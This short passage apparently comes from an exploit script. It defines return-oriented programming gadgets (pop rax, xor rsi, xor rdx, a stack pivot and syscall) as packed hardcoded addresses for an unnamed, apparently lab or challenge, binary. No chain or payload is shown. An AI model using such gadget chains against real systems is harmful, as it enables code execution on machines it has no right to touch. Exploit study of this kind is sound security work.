...
pop_rax_ret = p64(0x000000000040134e + 0x8)
xor_rsi_ret = p64(0x000000000040135b + 0x8)
xor_rdx_ret = p64(0x000000000040136a + 0x8)
mov_rsp_rdi_pop_ret = p64(0x0000000000401379 + 0x8)
syscall_ret = p64(0x000000000040138c + 0x8)
